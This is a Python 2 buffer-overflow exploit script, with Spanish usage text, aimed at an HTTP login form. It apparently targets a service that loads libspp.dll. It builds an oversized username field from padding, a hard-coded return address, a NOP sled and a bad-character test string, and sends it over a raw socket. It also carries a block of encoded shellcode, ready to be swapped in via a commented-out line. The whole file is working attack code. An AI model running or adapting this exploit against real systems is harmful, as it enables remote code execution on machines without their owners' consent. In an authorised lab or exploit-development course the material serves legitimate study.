#!/usr/bin/python2
import socket, sys

if len(sys.argv) != 3:
    print("Modo de uso: python ag_bufferoverflow.py <IP> <Port>")
    sys.exit()

target = sys.argv[1]
port = sys.argv[2]

# badchars = \x00\x0a\x0d\x25\x26\x3d

chars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = ("\xd9\xc1\xd9\x74\x24\xf4\xbd\xb9\xe2\xc9\xc5\x5f\x31\xc9"
"\xb1\x52\x31\x6f\x17\x83\xef\xfc\x03\xd6\xf1\x2b\x30\xd4"
"\x1e\x29\xbb\x24\xdf\x4e\x35\xc1\xee\x4e\x21\x82\x41\x7f"
"\x21\xc6\x6d\xf4\x67\xf2\xe6\x78\xa0\xf5\x4f\x36\x96\x38"
"\x4f\x6b\xea\x5b\xd3\x76\x3f\xbb\xea\xb8\x32\xba\x2b\xa4"
"\xbf\xee\xe4\xa2\x12\x1e\x80\xff\xae\x95\xda\xee\xb6\x4a"
"\xaa\x11\x96\xdd\xa0\x4b\x38\xdc\x65\xe0\x71\xc6\x6a\xcd"
"\xc8\x7d\x58\xb9\xca\x57\x90\x42\x60\x96\x1c\xb1\x78\xdf"
"\x9b\x2a\x0f\x29\xd8\xd7\x08\xee\xa2\x03\x9c\xf4\x05\xc7"
"\x06\xd0\xb4\x04\xd0\x93\xbb\xe1\x96\xfb\xdf\xf4\x7b\x70"
"\xdb\x7d\x7a\x56\x6d\xc5\x59\x72\x35\x9d\xc0\x23\x93\x70"
"\xfc\x33\x7c\x2c\x58\x38\x91\x39\xd1\x63\xfe\x8e\xd8\x9b"
"\xfe\x98\x6b\xe8\xcc\x07\xc0\x66\x7d\xcf\xce\x71\x82\xfa"
"\xb7\xed\x7d\x05\xc8\x24\xba\x51\x98\x5e\x6b\xda\x73\x9e"
"\x94\x0f\xd3\xce\x3a\xe0\x94\xbe\xfa\x50\x7d\xd4\xf4\x8f"
"\x9d\xd7\xde\xa7\x34\x22\x89\x6b\xdc\x38\x43\x1c\xdf\x40"
"\x52\x67\x56\xa6\x3e\x87\x3f\x71\xd7\x3e\x1a\x09\x46\xbe"
"\xb0\x74\x48\x34\x37\x89\x07\xbd\x32\x99\xf0\x4d\x09\xc3"
"\x57\x51\xa7\x6b\x3b\xc0\x2c\x6b\x32\xf9\xfa\x3c\x13\xcf"
"\xf2\xa8\x89\x76\xad\xce\x53\xee\x96\x4a\x88\xd3\x19\x53"
"\x5d\x6f\x3e\x43\x9b\x70\x7a\x37\x73\x27\xd4\xe1\x35\x91"
"\x96\x5b\xec\x4e\x71\x0b\x69\xbd\x42\x4d\x76\xe8\x34\xb1"
"\xc7\x45\x01\xce\xe8\x01\x85\xb7\x14\xb2\x6a\x62\x9d\xc2"
"\x20\x2e\xb4\x4a\xed\xbb\x84\x16\x0e\x16\xca\x2e\x8d\x92"
"\xb3\xd4\x8d\xd7\xb6\x91\x09\x04\xcb\x8a\xff\x2a\x78\xaa"
"\xd5")

# return_address = 0x10090c83 - libspp.dll
data = "A" * 780 + "\x83\x0c\x09\x10" + "\x90" * 16 + chars * (1200-784)
# data = "A" * 780 + "BBBB" + payload * (1200-784)
size = len(data) + len("username=&password=A")

request="POST /login HTTP/1.1\r\n"
request+="Host: "+str(target)+"\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n"
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="Content-Length: "+str(size)+"\r\n"
# request+="Referer: http://"+str(target)+"/login\r\n"
# request+="Origin: http://"+str(target)+"\r\n"
request+="Connection: close\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
request+="username="+data+"&password=A"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,int(port)))
s.send(request)